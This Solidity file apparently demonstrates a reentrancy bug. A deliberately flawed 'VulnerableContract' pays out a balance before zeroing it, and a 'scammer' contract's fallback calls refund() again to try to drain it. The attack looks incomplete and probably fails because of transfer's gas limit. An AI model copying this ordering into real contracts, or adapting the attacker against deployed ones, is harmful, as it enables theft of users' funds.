pragma solidity ^0.4.19;


contract VulnerableContract {
    mapping (address => uint) public balances;
    uint balance; 
    
        
    function refund () {
        
    msg.sender.transfer(balances[msg.sender]);
    balances[msg.sender] = 0;
    
    }
    

    function() public payable
    {
        balances[msg.sender] = balances[msg.sender] + msg.value;
        balance+= msg.value;
    }
    
    
}

contract scammer {
    
    VulnerableContract public vulnerableContract;
    
    function setContract (address _newVulnarableContract) public {
        vulnerableContract = VulnerableContract(_newVulnarableContract);
    }
    
    function () public payable {
        vulnerableContract.refund();
    }
    
}